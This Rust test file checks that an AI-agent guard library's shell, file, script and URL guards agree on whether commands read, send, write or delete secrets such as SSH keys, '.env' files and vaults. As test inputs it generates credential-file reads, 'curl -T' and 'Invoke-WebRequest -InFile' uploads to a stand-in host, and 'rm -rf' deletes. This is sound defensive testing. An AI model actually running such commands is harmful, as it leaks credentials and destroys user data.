//! The shell guard and the file guard give the same answer for the same file.
//!
//! An agent refused a key on the file API can read it through the shell, so
//! `cat <path>` must be `read_secret` exactly when a read of `<path>` is, for
//! every path the file guard's own cases name, on a POSIX machine, a Mac and
//! a Windows one (in PowerShell and in cmd). The paths are read from every
//! case file of the file guard, `crates/file/tests/cases/*.cases` (the path
//! of each case, and the paths each `paths` line names), so a case added
//! there is held against the shell as soon as it lands. The paths of a case
//! file are also judged on each machine its `paths` lines declare that names
//! a secret (`secret_file=`, `secret_folder=`), a drive mount
//! (`drive_mount=`) or a Windows home (`windows_home=`), with the protected
//! paths and the secrets it names, so a secret the caller names and a drive
//! spelled through a mount get one answer too.

#![cfg(all(feature = "shell", feature = "file"))]
#![allow(
    clippy::disallowed_methods,
    clippy::disallowed_macros,
    reason = "this test reads the repository's own files, which no guard may do"
)]

#[path = "../../core/tests/common/cases.rs"]
mod format;

use std::collections::{BTreeSet, HashMap};
use std::fs;
use std::path::{Path, PathBuf};

use format::{Word, PATH_FIELDS};
use milo_guards::file::{self, Access};
#[cfg(all(feature = "script", feature = "url"))]
use milo_guards::script;
use milo_guards::shell::{self, Shell};
use milo_guards::{Paths, Protected, Secret};

/// The most a path may have in it for a case to be one worth a line.
const LONGEST: usize = 300;

/// The folder of the file guard's case files.
fn folder() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../file/tests/cases")
}

/// The names of the file guard's case files, sorted.
fn case_files() -> Result<Vec<String>, String> {
    let entries =
        fs::read_dir(folder()).map_err(|e| format!("cannot read {}: {e}", folder().display()))?;
    let mut names: Vec<String> = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().is_some_and(|ext| ext == "cases"))
        .filter_map(|path| Some(path.file_stem()?.to_str()?.to_string()))
        .collect();
    names.sort();
    Ok(names)
}

/// The records of the file guard's case file `name`.
fn records_of(name: &str) -> Result<Vec<format::Record>, String> {
    let shown = format!("crates/file/tests/cases/{name}.cases");
    let path = folder().join(format!("{name}.cases"));
    let source =
        fs::read_to_string(&path).map_err(|e| format!("cannot read {}: {e}", path.display()))?;
    format::parse(&shown, &source).map_err(|refused| refused.join("\n"))
}

/// Every path the case file `name` of the file guard names: the path of each
/// case, and each path a `paths` line names.
fn paths_of(name: &str) -> Result<Vec<String>, String> {
    let records = records_of(name)?;
    let mut found = Vec::new();
    for record in records {
        match record.text {
            Some(text) => found.push(text),
            None => found.extend(record.words.into_iter().filter_map(|word| match word {
                Word::Field(field, value) if PATH_FIELDS.contains(&field.as_str()) => Some(value),
                _ => None,
            })),
        }
    }
    Ok(found)
}

/// The paths of the file guard's cases: each that a line can name whole.
fn paths_of_the_cases() -> Result<BTreeSet<String>, String> {
    let mut found = BTreeSet::new();
    for name in case_files()? {
        found.extend(paths_of(&name)?.into_iter().filter(|path| {
            !path.is_empty()
                && path.len() <= LONGEST
                && !path.chars().any(char::is_control)
                && !path.starts_with(char::is_whitespace)
        }));
    }
    Ok(found)
}

/// Whether `read_secret` is among the file guard's findings for a read of
/// `path`; `None` when the path is not one literal path the shell could be
/// given (a wildcard, a variable, `~user`: the file guard calls it
/// unreadable).
fn file_says(path: &str, paths: &Paths) -> Option<bool> {
    let assessment = file::judge(Access::Read, path, paths);
    let found: Vec<_> = assessment.findings().iter().map(|f| f.rule).collect();
    if found.contains(&file::Rule::Unreadable) {
        return None;
    }
    Some(found.contains(&file::Rule::ReadSecret))
}

fn shell_says(line: &str, shell: Shell, paths: &Paths) -> bool {
    shell::classify(line, shell, paths)
        .findings()
        .iter()
        .any(|finding| finding.rule == shell::Rule::ReadSecret)
}

/// The lines that read `path` in `shell`, in every form that names it whole:
/// quoted as the shell reads it as written, as a `<` redirect's source (cmd
/// and POSIX), and, where the path starts at the home directory, spelled with
/// the variable that names it (`$HOME`, `%USERPROFILE%`). A path a form cannot
/// carry is left out of that form, never out of the others:
///
/// - cmd cannot carry `"`: no Windows name has one, so there is nothing to
///   judge;
/// - cmd cannot carry `%`: it expands `%name%` even in quotes, so the word is a
///   variable and not this file;
/// - cmd cannot carry `^`: the guard reads a caret as cmd's escape, which cmd
///   does not do inside quotes (a known gap, kept visible by the skip);
/// - a word spelled with `$HOME` cannot carry `$`, a backtick, `"` or `\`
///   (POSIX), which are not plain text in it, nor, bare in PowerShell, a space
///   or one of `;|&(){},'"<>@#`, which end the word.
fn lines(path: &str, shell: Shell, home: &str) -> Vec<String> {
    let mut lines = Vec::new();
    // The path with the home directory spelled as a variable, when it starts
    // there (whole parts, without case on Windows).
    let under = |variable: &str| {
        let rest = path.get(home.len()..)?;
        let same = path.get(..home.len()).is_some_and(|head| {
            if home.starts_with('/') {
                head == home
            } else {
                head.eq_ignore_ascii_case(home)
            }
        });
        (same && (rest.is_empty() || rest.starts_with(['/', '\\'])))
            .then(|| format!("{variable}{rest}"))
    };
    match shell {
        Shell::Posix => {
            let quoted = format!("'{}'", path.replace('\'', "'\\''"));
            lines.push(format!("cat {quoted}"));
            lines.push(format!("cat < {quoted}"));
            lines.push(format!("base64 <{quoted}"));
            if let Some(spelled) =
                under("$HOME").filter(|text| !text.contains(['"', '$', '`', '\\', '!', '\n']))
            {
                lines.push(format!("cat \"{spelled}\""));
                lines.push(format!("cat < \"{spelled}\""));
            }
        }
        Shell::PowerShell => {
            let quoted = format!("'{}'", path.replace('\'', "''"));
            lines.push(format!("Get-Content -LiteralPath {quoted}"));
            lines.push(format!("Get-Content {quoted}"));
            lines.push(format!("Get-Content -Path {quoted} -Raw"));
            if let Some(spelled) = under("$HOME") {
                if !spelled.contains([
                    ' ', ';', '|', '&', '(', ')', '{', '}', ',', '\'', '"', '<', '>', '@', '#',
                    '$', '`',
                ]) {
                    lines.push(format!("Get-Content {spelled}"));
                    lines.push(format!("Get-Content -Path {spelled}"));
                }
            }
        }
        Shell::Cmd if !path.contains(['"', '%', '^']) => {
            lines.push(format!("type \"{path}\""));
            lines.push(format!("more < \"{path}\""));
            lines.push(format!("more <\"{path}\""));
            lines.push(format!("sort < \"{path}\""));
            lines.push(format!("findstr x 0< \"{path}\""));
            if !path.contains([' ', '&', '|', '<', '>', '(', ')', ',', ';', '=']) {
                lines.push(format!("more < {path}"));
            }
            if let Some(spelled) = under("%USERPROFILE%") {
                lines.push(format!("type \"{spelled}\""));
                lines.push(format!("more < \"{spelled}\""));
            }
        }
        _ => {}
    }
    lines
}

/// The three machines a case names by default, by the names a `paths` line's
/// `base=` gives them.
fn machines() -> HashMap<String, Paths> {
    HashMap::from([
        (
            "posix".to_string(),
            Paths::new("/home/me/work/repo", "/home/me", ["/home/me/work/repo"]),
        ),
        (
            "macos".to_string(),
            Paths::new("/Users/me/dev/repo", "/Users/me", ["/Users/me/dev/repo"]),
        ),
        (
            "windows".to_string(),
            Paths::new(
                r"C:\Users\me\dev\repo",
                r"C:\Users\me",
                [r"C:\Users\me\dev\repo"],
            ),
        ),
    ])
}

/// The machines the `paths` lines of the case file `name` declare, with the
/// protected paths and the secrets each names, in order.
fn declared_in(name: &str) -> Result<Vec<Paths>, String> {
    let mut known = machines();
    let mut declared = Vec::new();
    for record in records_of(name)? {
        if record.text.is_some() || record.words.first() != Some(&Word::Bare("paths".to_string())) {
            continue;
        }
        let made = format::declaration(&record.words[1..])
            .map_err(|why| format!("{}: {why}", record.at))?;
        let mut paths = match (&made.base, made.cwd, made.home) {
            (Some(base), ..) => known
                .get(base)
                .cloned()
                .ok_or_else(|| format!("{}: no paths named `{base}`", record.at))?,
            (None, Some(cwd), Some(home)) => Paths::new(cwd, home, Vec::<PathBuf>::new()),
            _ => return Err(format!("{}: no base, cwd or home", record.at)),
        };
        paths.workspaces.extend(made.workspaces);
        for named in made.named {
            paths = match (named.secret, named.folder) {
                (false, true) => paths.with_protected([Protected::folder(named.path, named.words)]),
                (false, false) => paths.with_protected([Protected::file(named.path, named.words)]),
                (true, true) => paths.with_secrets([Secret::folder(named.path, named.words)]),
                (true, false) => paths.with_secrets([Secret::file(named.path, named.words)]),
            };
        }
        paths = paths.with_drive_mounts(made.drive_mounts);
        if let Some(home) = made.windows_home {
            paths = paths.with_windows_home(home);
        }
        known.insert(made.name, paths.clone());
        declared.push(paths);
    }
    Ok(declared)
}

/// The shells a line is read in on `paths`: POSIX on a POSIX machine,
/// PowerShell and cmd on a Windows one.
fn shells_of(paths: &Paths) -> &'static [Shell] {
    let home = paths.home.to_string_lossy();
    if home.starts_with('/') {
        &[Shell::Posix]
    } else {
        &[Shell::PowerShell, Shell::Cmd]
    }
}

/// Whether the shell and the file guard agree on reading `path` on `paths`,
/// in every line that names it: each line they do not agree on, and how many
/// were judged and secrets.
fn disagree(path: &str, paths: &Paths, shells: &[Shell]) -> (Vec<String>, usize, usize) {
    let (mut wrong, mut judged, mut flagged) = (Vec::new(), 0_usize, 0_usize);
    let Some(expected) = file_says(path, paths) else {
        return (wrong, judged, flagged);
    };
    let home = paths.home.to_string_lossy();
    for &shell in shells {
        for line in lines(path, shell, &home) {
            judged += 1;
            flagged += usize::from(expected);
            let got = shell_says(&line, shell, paths);
            if got != expected {
                wrong.push(format!(
                    "{shell:?} on {home}: the file guard says read_secret = {expected}, \
                     the shell says {got}: {line}"
                ));
            }
        }
    }
    (wrong, judged, flagged)
}

#[test]
fn the_shell_and_the_file_guard_agree_on_every_path_of_the_file_guards_cases() {
    let cases = paths_of_the_cases().expect("the file guard's case files are readable");
    let machines = machines();
    let (mut wrong, mut judged, mut flagged) = (Vec::new(), 0_usize, 0_usize);
    for path in &cases {
        for name in ["posix", "macos", "windows"] {
            let paths = &machines[name];
            let (more, of, hits) = disagree(path, paths, shells_of(paths));
            wrong.extend(more);
            judged += of;
            flagged += hits;
        }
    }
    // The case files are read, and name keys: not an empty scan that agrees
    // on nothing.
    assert!(judged > 10_000, "only {judged} lines were judged");
    assert!(flagged > 2_000, "only {flagged} of them read a secret");
    assert!(
        wrong.is_empty(),
        "{} of {judged} lines are judged differently:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

/// Whether `paths` names what changes where a path lands or what it is: a
/// secret, a drive mount or a Windows home.
fn names_more(paths: &Paths) -> bool {
    !paths.secrets.is_empty() || !paths.drive_mounts.is_empty() || paths.windows_home.is_some()
}

/// The same on each machine a case file declares that names a secret, a
/// drive mount or a Windows home: what the caller names changes what a read
/// is, and the two guards still give one answer for every path of that
/// file.
#[test]
fn the_shell_and_the_file_guard_agree_on_the_machines_the_cases_declare() {
    let (mut wrong, mut judged, mut flagged) = (Vec::new(), 0_usize, 0_usize);
    for name in case_files().expect("the file guard's case files are listed") {
        let declared = declared_in(&name).expect("the declarations are readable");
        let paths_of_file: BTreeSet<String> = paths_of(&name)
            .expect("the case file is readable")
            .into_iter()
            .filter(|path| {
                !path.is_empty()
                    && path.len() <= LONGEST
                    && !path.chars().any(char::is_control)
                    && !path.starts_with(char::is_whitespace)
            })
            .collect();
        for paths in declared.iter().filter(|paths| names_more(paths)) {
            for path in &paths_of_file {
                let (more, of, hits) = disagree(path, paths, shells_of(paths));
                wrong.extend(more.into_iter().map(|line| format!("{name}: {line}")));
                judged += of;
                flagged += hits;
            }
        }
    }
    // The declared machines name secrets of their own: some reads are ones.
    assert!(judged > 500, "only {judged} lines were judged");
    assert!(flagged > 150, "only {flagged} of them read a secret");
    assert!(
        wrong.is_empty(),
        "{} of {judged} lines are judged differently:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

/// The machines a case names by default, each with secrets named: a file in
/// the workspace, a folder beside the home directory's keys and a file in a
/// temporary folder, so every spelling of the file guard's own cases is held
/// to one answer where a named secret may change it.
fn named_machines() -> Vec<Paths> {
    let machines = machines();
    let named = |name: &str, workspace: &str, home: &str, temp: &str, separator: char| {
        machines[name].clone().with_secrets([
            Secret::file(
                format!("{workspace}{separator}.env"),
                "the project's environment file",
            ),
            Secret::folder(format!("{home}{separator}.vault"), "your password vault"),
            Secret::file(temp.to_string(), "the session token"),
        ])
    };
    vec![
        named(
            "posix",
            "/home/me/work/repo",
            "/home/me",
            "/tmp/s/token",
            '/',
        ),
        named(
            "macos",
            "/Users/me/dev/repo",
            "/Users/me",
            "/tmp/s/token",
            '/',
        ),
        named(
            "windows",
            r"C:\Users\me\dev\repo",
            r"C:\Users\me",
            r"C:\Users\me\AppData\Local\Temp\s\token",
            '\\',
        ),
    ]
}

/// Every spelling of the file guard's `posix.cases` and `windows.cases`, on
/// each machine with secrets named: the two guards give one answer for each,
/// with none left out.
#[test]
fn the_shell_and_the_file_guard_agree_on_every_spelling_where_secrets_are_named() {
    let mut spellings: BTreeSet<String> = BTreeSet::new();
    for name in ["posix", "windows"] {
        spellings.extend(
            paths_of(name)
                .expect("the case file is readable")
                .into_iter()
                .filter(|path| {
                    !path.is_empty()
                        && path.len() <= LONGEST
                        && !path.chars().any(char::is_control)
                        && !path.starts_with(char::is_whitespace)
                }),
        );
    }
    // Each spelling of a key's folder, as a spelling of the named folder
    // beside it: `~/.SSH/id_rsa` as `~/.VAULT/id_rsa`, `SSH~1` as `VAULT~1`.
    let vault: Vec<String> = spellings
        .iter()
        .filter_map(|path| {
            let lower = path.to_lowercase();
            let at = lower.find(".ssh").map(|at| (at, ".ssh", ".vault"));
            let at = at.or_else(|| lower.find("ssh~1").map(|at| (at, "ssh~1", "vault~1")));
            let (at, from, to) = at?;
            let spelled = &path[at..at + from.len()];
            let to = if spelled.chars().any(char::is_uppercase) {
                to.to_uppercase()
            } else {
                to.to_string()
            };
            Some(format!("{}{to}{}", &path[..at], &path[at + from.len()..]))
        })
        .collect();
    spellings.extend(vault);
    let (mut wrong, mut judged, mut flagged) = (Vec::new(), 0_usize, 0_usize);
    for paths in &named_machines() {
        for path in &spellings {
            let (more, of, hits) = disagree(path, paths, shells_of(paths));
            wrong.extend(more);
            judged += of;
            flagged += hits;
        }
    }
    // Of those, the ones the file guard calls a read of a named secret, in
    // its words: the spellings reach the named paths, not core's keys alone.
    const NAMED: [&str; 3] = [
        "reads the project's environment file",
        "reads your password vault",
        "reads the session token",
    ];
    let named = named_machines()
        .iter()
        .flat_map(|paths| spellings.iter().map(move |path| (path, paths)))
        .filter(|(path, paths)| {
            file::judge(Access::Read, path, paths)
                .findings()
                .iter()
                .any(|finding| NAMED.contains(&finding.reason.as_str()))
        })
        .count();
    assert!(judged > 5_000, "only {judged} lines were judged");
    assert!(flagged > 1_000, "only {flagged} of them read a secret");
    assert!(named > 100, "only {named} spellings read a named secret");
    assert!(
        wrong.is_empty(),
        "{} of {judged} lines are judged differently:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

/// The POSIX machine a case names by default on WSL, the drives under
/// `/mnt` and the Windows home named, and the Windows one in Git Bash, its
/// drives under `/`.
fn mounted_machines() -> Vec<Paths> {
    let machines = machines();
    vec![
        machines["posix"]
            .clone()
            .with_drive_mounts(["/mnt"])
            .with_windows_home(r"C:\Users\me"),
        machines["windows"].clone().with_drive_mounts(["/"]),
    ]
}

/// Every spelling of the file guard's `posix.cases` and `windows.cases`, on
/// each machine with its drive mounts named, and each spelling of a path
/// under the home directory written through the mounted drive
/// (`/mnt/c/Users/me/...` for `/home/me/...`): the two guards give one
/// answer for each, and the spellings through the mount do read keys.
#[test]
fn the_shell_and_the_file_guard_agree_on_every_spelling_through_mounts() {
    let mut spellings: BTreeSet<String> = BTreeSet::new();
    for name in ["posix", "windows"] {
        spellings.extend(
            paths_of(name)
                .expect("the case file is readable")
                .into_iter()
                .filter(|path| {
                    !path.is_empty()
                        && path.len() <= LONGEST
                        && !path.chars().any(char::is_control)
                        && !path.starts_with(char::is_whitespace)
                }),
        );
    }
    let mut through: BTreeSet<String> = BTreeSet::new();
    for path in &spellings {
        // The home directory's paths, through the drive: on WSL its Windows
        // home's, in Git Bash the drive's from `/`.
        for home in ["~/", "/home/me/"] {
            if let Some(rest) = path.strip_prefix(home) {
                through.insert(format!("/mnt/c/Users/me/{rest}"));
                through.insert(format!("/c/Users/me/{rest}"));
            }
        }
    }
    spellings.extend(through.iter().cloned());
    let (mut wrong, mut judged, mut flagged) = (Vec::new(), 0_usize, 0_usize);
    for paths in &mounted_machines() {
        for path in &spellings {
            let (more, of, hits) = disagree(path, paths, shells_of(paths));
            wrong.extend(more);
            judged += of;
            flagged += hits;
        }
    }
    // Of the spellings made here, the ones the file guard calls a read of a
    // key on WSL: the mount is followed, not only spelled.
    let wsl = &mounted_machines()[0];
    let reached = through
        .iter()
        .filter(|path| {
            file::judge(Access::Read, path, wsl)
                .findings()
                .iter()
                .any(|finding| finding.rule == file::Rule::ReadSecret)
        })
        .count();
    assert!(judged > 5_000, "only {judged} lines were judged");
    assert!(flagged > 1_000, "only {flagged} of them read a secret");
    assert!(
        reached > 20,
        "only {reached} spellings through the mount read a key"
    );
    assert!(
        wrong.is_empty(),
        "{} of {judged} lines are judged differently:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

#[test]
fn each_case_file_names_its_paths() {
    let posix = paths_of("posix").expect("posix.cases is readable");
    // A case's path, decoded, and a path a `paths` line names.
    assert!(posix.iter().any(|path| path == "~/.ssh\\id_rsa"));
    assert!(posix.iter().any(|path| path == "/home/me/.docker/proj"));
    let windows = paths_of("windows").expect("windows.cases is readable");
    assert!(windows
        .iter()
        .any(|path| path == r"\\?\C:\Users\me\.ssh\id_rsa"));
    assert!(windows.iter().any(|path| path == r"C:\Users\Camilo Azula"));
    let protected = paths_of("protected").expect("protected.cases is readable");
    assert!(protected.iter().any(|path| path == "/home/me/.agent"));
    let named = paths_of("named_secrets").expect("named_secrets.cases is readable");
    assert!(named.iter().any(|path| path == "/home/me/work/repo/.env"));
    let declared = declared_in("named_secrets").expect("its declarations are readable");
    assert!(declared.iter().any(|paths| !paths.secrets.is_empty()));
    let declared = declared_in("drives").expect("its declarations are readable");
    assert!(declared.iter().any(|paths| !paths.drive_mounts.is_empty()));
    assert!(declared.iter().any(|paths| paths.windows_home.is_some()));
    assert!(paths_of("no_such_cases").is_err());
    // Every case file is read, the ones that were tables first among them.
    let names = case_files().expect("the case files are listed");
    for name in [
        "posix",
        "windows",
        "protected",
        "limits",
        "startup",
        "named_secrets",
        "drives",
    ] {
        assert!(
            names.iter().any(|listed| listed == name),
            "{name}: {names:?}"
        );
    }
}

#[cfg(all(feature = "script", feature = "url"))]
/// A word the shell reads as `path` whole, quoted for `shell`; `None` for a
/// path a quote cannot carry.
fn quoted(path: &str, shell: Shell) -> Option<String> {
    (!path.contains(['\'', '\n'])).then(|| {
        if shell == Shell::Cmd {
            format!("\"{path}\"")
        } else {
            format!("'{path}'")
        }
    })
}

#[cfg(all(feature = "script", feature = "url"))]
/// Every answer the guards give for `path` on `paths` that must be one: a
/// write is risky to the file guard exactly when the shell's redirect is; a
/// read is a read of a key to the file guard exactly when the script guard's
/// read reads one, and then the shell's send sends one; a delete is risky to
/// the shell exactly when the script guard's is; and a `file:` URL to an
/// absolute path reads in the file guard's words for a key. Each that is
/// not, named. By design, and in every case file too: the shell's send also
/// finds a file by a name that looks like a secret (`.env`), and sends a
/// public key (`.pub`) as no secret, so a send is held one way and not for
/// a public key; what the kernel serves is the file guard's and the script
/// guard's read alone; and the file guard judges a write to a folder that
/// holds a protected path as a write of what it holds, where a redirect
/// writes into it, so such a folder's write is left out.
fn disagree_on_acts(path: &str, paths: &Paths) -> (Vec<String>, usize) {
    let mut wrong = Vec::new();
    let mut judged = 0;
    let windows = !paths.home.to_string_lossy().starts_with('/');
    let shell = if windows {
        Shell::PowerShell
    } else {
        Shell::Posix
    };
    let Some(word) = quoted(path, shell) else {
        return (wrong, judged);
    };
    if file_says(path, paths).is_none() {
        return (wrong, judged);
    }
    let read = file::judge(Access::Read, path, paths);
    let read_secret = read
        .findings()
        .iter()
        .find(|finding| finding.rule == file::Rule::ReadSecret)
        .map(|finding| finding.reason.clone());
    let wrote = !file::judge(Access::Write, path, paths).is_safe();
    let kernel = read_secret.as_deref().is_some_and(|reason| {
        reason.contains("kernel") || reason.contains("device") || reason.contains("disk")
    });
    let absolute = if path.starts_with(['/', '\\']) || path.get(1..2) == Some(":") {
        path.to_string()
    } else {
        let separator = if windows { "\\" } else { "/" };
        format!("{}{separator}{path}", paths.cwd.display())
    };
    // A folder that holds a protected path, or a workspace.
    let holder = paths
        .protected
        .iter()
        .map(|named| named.path.to_string_lossy().into_owned())
        .any(|below| {
            below.len() > absolute.len()
                && below.to_lowercase().starts_with(&absolute.to_lowercase())
        })
        || paths
            .workspaces
            .iter()
            .any(|folder| folder.to_string_lossy().eq_ignore_ascii_case(&absolute));
    let (write_line, send_line, delete_line) = if windows {
        (
            format!("Set-Content -LiteralPath {word} x"),
            format!("Invoke-WebRequest -InFile {word} -Method Put https://x.example"),
            format!("Remove-Item -LiteralPath {word} -Recurse"),
        )
    } else {
        (
            format!("echo x > {word}"),
            format!("curl -T {word} https://x.example"),
            format!("rm -rf {word}"),
        )
    };
    let finds = |line: &str, rule: shell::Rule| {
        shell::classify(line, shell, paths)
            .findings()
            .iter()
            .any(|finding| finding.rule == rule)
    };
    let mut check = |what: &str, a: bool, b: bool| {
        judged += 1;
        if a != b {
            wrong.push(format!(
                "{what} on {}: {path} ({a} against {b})",
                paths.home.display()
            ));
        }
    };
    if !holder {
        check(
            "write: the file guard, the shell",
            wrote,
            !shell::classify(&write_line, shell, paths).is_safe(),
        );
    }
    // A public key sent off is no secret to the shell, which reads it by
    // name; the file guard's read of one is a key's, as everything under
    // `.ssh` is.
    let public = path.to_ascii_lowercase().ends_with(".pub");
    if read_secret.is_some() && !kernel && !public {
        check(
            "send: the file guard's read, the shell's send",
            true,
            finds(&send_line, shell::Rule::SendSecret),
        );
    }
    let code_path = path.replace('\\', "\\\\");
    let reads = script::judge(
        script::Language::Python,
        &format!("print(open('{code_path}').read())"),
        paths,
    )
    .findings()
    .iter()
    .any(|finding| finding.rule == script::Rule::ReadSecret);
    check(
        "read: the file guard, the script guard",
        read_secret.is_some(),
        reads,
    );
    let deletes = |assessment: milo_guards::Assessment<script::Rule>| {
        assessment
            .findings()
            .iter()
            .any(|finding| matches!(finding.rule, script::Rule::Delete | script::Rule::WipeDisk))
    };
    let script_deletes = deletes(script::judge(
        script::Language::Python,
        &format!("import shutil\nshutil.rmtree('{code_path}')"),
        paths,
    ));
    // A long path is PowerShell's to read as a provider path too, which
    // adds a finding of its own to a delete there.
    if !path.starts_with("\\\\") {
        let shell_deletes =
            finds(&delete_line, shell::Rule::Delete) || finds(&delete_line, shell::Rule::WipeDisk);
        check(
            "delete: the shell, the script guard",
            shell_deletes,
            script_deletes,
        );
    }
    // A `file:` URL to an absolute POSIX path reads in the file guard's
    // words for a key.
    if let (false, true, Some(reason), false) =
        (windows, path.starts_with('/'), &read_secret, kernel)
    {
        if !path.contains(['%', '#', '?', ' ', '\\']) {
            let said = milo_guards::url::judge(&format!("file://{path}"), paths)
                .findings()
                .iter()
                .any(|finding| finding.reason == *reason);
            check("read: the file guard, a file: URL", true, said);
        }
    }
    (wrong, judged)
}

/// Writes, deletes, sends and reads, on the machines the file guard's
/// `drives.cases` declares and on the mounted machines, of the paths of
/// that file and of its `posix.cases` spelled through the mounted drive,
/// held to one answer by every guard that places a path: the shell, the
/// file, the script and the URL guards.
#[cfg(all(feature = "script", feature = "url"))]
#[test]
fn the_guards_agree_on_writes_deletes_sends_and_reads_through_mounts() {
    let mut machines: Vec<(String, Paths)> = declared_in("drives")
        .expect("the declarations are readable")
        .into_iter()
        .filter(names_more)
        .map(|paths| ("drives".to_string(), paths))
        .collect();
    machines.extend(
        mounted_machines()
            .into_iter()
            .map(|paths| ("mounted".to_string(), paths)),
    );
    let mut spellings: BTreeSet<String> = paths_of("drives")
        .expect("the case file is readable")
        .into_iter()
        .filter(|path| {
            !path.is_empty() && path.len() <= LONGEST && !path.chars().any(char::is_control)
        })
        .collect();
    // And each path of `posix.cases` under the home directory, through the
    // mounted drive.
    for path in paths_of("posix").expect("the case file is readable") {
        for home in ["~/", "/home/me/"] {
            if let Some(rest) = path.strip_prefix(home) {
                if rest.len() <= LONGEST && !rest.chars().any(char::is_control) {
                    spellings.insert(format!("/mnt/c/Users/me/{rest}"));
                }
            }
        }
    }
    let (mut wrong, mut judged) = (Vec::new(), 0_usize);
    for (name, paths) in &machines {
        for path in &spellings {
            let (more, of) = disagree_on_acts(path, paths);
            wrong.extend(more.into_iter().map(|line| format!("{name}: {line}")));
            judged += of;
        }
    }
    assert!(judged > 2_500, "only {judged} answers were compared");
    assert!(
        wrong.is_empty(),
        "{} of {judged} answers differ:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}
